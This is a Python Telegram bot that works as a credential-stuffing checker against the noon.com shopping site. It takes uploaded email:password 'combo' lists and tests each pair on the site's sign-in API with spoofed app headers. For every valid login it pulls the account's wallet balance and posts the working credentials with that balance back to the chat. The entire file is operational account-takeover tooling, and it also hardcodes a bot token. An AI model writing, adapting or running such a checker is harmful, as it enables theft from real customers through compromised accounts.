import os,sys
from bs4 import BeautifulSoup
import random
import string
import telebot
from telebot import types
import time
import requests 
from uuid import uuid4

token = "6047075637:AAGq1Np0y4FT8iuVLCpM-F-vLuBkARmK-Fo"
a = True
bb = True
bot = telebot.TeleBot(token)



@bot.message_handler(commands=['start'])
def start(message):
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,
                   f"""Hi  [{first + last}]({url}) 
Bot check cc \n pls send combo and wait""",
                   parse_mode="markdown")




@bot.message_handler(content_types=['document'])
def send_file(message):
        global a,bb
        if not bb:
            return bot.reply_to(message, text=f'✅check one combo')
        insufficient_funds = 0
        charge = 0
        Bad = 0
        try:
            file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
            with open(f"{message.document.file_name}", 'wb') as f:
                f.write(file_input)
        except:
            bot.reply_to(message, text='  Wrong File ❌ .')
        mas = types.InlineKeyboardMarkup(row_width=1)
        h7am0 = types.InlineKeyboardButton('𝘍𝘢𝘙e𝘴 𝘔𝘰7𝘔𝘦𝘥 🇵🇸', url='https://t.me/SWCDL')
        mas.add(h7am0)
        file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
        file_content = file_input.decode('utf-8')
        alll = len(file_input)
        lool = bot.reply_to(message, text=f' CHECKING...{alll} ', reply_markup=mas)
        a = True
        bb = False
        lines = file_content.strip().split('\n')
        for visaa in lines:
            if not a:
                break
            import requests
            try:
                email = visaa.split(':')[0]
                password = visaa.split(':')[1]
            
            except:
                continue
            try:
                A = uuid4()
                url =  "https://api-app.noon.com/_svc/customer-v1/auth/signin"
                
                data = '{"email": "'+email+'","password": "'+password+'"}'
                headers = {
                "Host":"api-app.noon.com" ,
                "Content-Type":"application/json" ,
                "X-Experience":"ecom" ,
                "X-Locale":"ar-sa" ,
                "Accept":"application/json, text/plain, */*" ,
                "X-Mp":"noon" ,
                "Accept-Language":"en-us" ,
                "Cache-Control":"no-cache" ,
                "X-Content":"mobile" ,
                "User-Agent":"noon/1022 CFNetwork/1240.0.4 Darwin/20.5.0" ,
                "X-Device-Id": str(A),
                "X-Platform":"ios" ,
                "X-Build":"1022" ,
                "Connection":"close" ,
                }
                
                
                response = requests.post(url, headers =headers, data =data)
                if response.status_code == 400 or response.status_code == 422 or response.status_code == 405:
                            insufficient_funds += 1
                            ms = types.InlineKeyboardMarkup(row_width=1)
                            ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                            B = types.InlineKeyboardButton(f"BAD ❌ ￫ {insufficient_funds}", callback_data="Fsi1")
                            e = types.InlineKeyboardButton(f"SUCCESS LOGIN ✅ ￫ {charge}", callback_data="Fsi1")
                            z = types.InlineKeyboardButton(f" Bad ￫ {Bad}", callback_data="Fakz1")
                            h7am0 = types.InlineKeyboardButton('𝘍𝘢𝘙e𝘴 𝘔𝘰7𝘔𝘦𝘥 🇵🇸', url='https://t.me/SWCDL')
                            ms.add(ALA,B, e, z, h7am0)
                            bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text=" CHECKING CC... ✅ \n STOP USING /stop", reply_markup=ms)
         
                elif response.status_code == 200:
                    charge +=1
                    name = response.text.split('"firstName":"')[1].split('"')[0]
                    countryCode = response.text.split('"countryCode":"')[1].split('"')[0]
                    cookies= response.cookies
                    url = "https://api-app.noon.com/_svc/customer-v1/credit" 
                    headers = {
                "accept":"application/json, text/plain, */*", 
                "cache-control":"no-cache", 
                "x-platform":"android", 
                "x-device-id":"fc5a7078504a2183", 
                "x-build":"957", 
                "x-content":"mobile", 
                "x-mp":"noon", 
                "x-locale":f"en-{countryCode}", 
                "Host":"api-app.noon.com", 
                "Connection":"Keep-Alive", 
                "User-Agent":"okhttp/3.12.12", 
                }
                    response = requests.get(url, headers =headers, cookies=cookies)
                    balance = response.json()['data']['balance']
                    currencyCode = response.json()['data']['currencyCode']
                    MSG = f"SUCCESS LOGIN ✅\n\nEMAIL ￫ {email}\nPASSWORD: {password}\nBALANCE ￫ {balance}\nCURRENCY ￫ {currencyCode}\nNAME ￫ {name}\n CURRENCY CODE ￫ {countryCode}"
                    bot.send_message(message.chat.id,f"{MSG}",parse_mode='html')
                elif response.status_code == 403:
                            Bad += 1
                            ms = types.InlineKeyboardMarkup(row_width=1)
                            ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                            B = types.InlineKeyboardButton(f"BAD ❌￫ {insufficient_funds}", callback_data="Fsi1")
                            e = types.InlineKeyboardButton(f"SUCCESS LOGIN ✅ ￫ {charge}", callback_data="Fsi1")
                            z = types.InlineKeyboardButton(f" OFF  ￫ {Bad}", callback_data="Fakz1")
                            h7am0 = types.InlineKeyboardButton('𝘍𝘢𝘙e𝘴 𝘔𝘰7𝘔𝘦𝘥 🇵🇸', url='https://t.me/SWCDL')
                            ms.add(ALA,B, e, z, h7am0)
                            bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text=" CHECKING CC... ✅ \n STOP USING /stop", reply_markup=ms)
         

            except Exception as e:
                print(f"\033[33m {e}")
                print('\033[0m ++++++++++++++++++++++++++++++++')



@bot.message_handler(commands=['stop'])
def start(message):
        global a,bb
        a = False  
        bb = True
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,
                   f"""DONE CHECKING CC ✅""",
                   parse_mode="markdown")




print("""


   bot run ...
   enjoy""")

try:
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
except (ConnectionError) as e:
    sys.stdout.flush()
    os.execv(sys.argv[0], sys.argv)
else:
    bot.infinity_polling(timeout=25, long_polling_timeout=10)
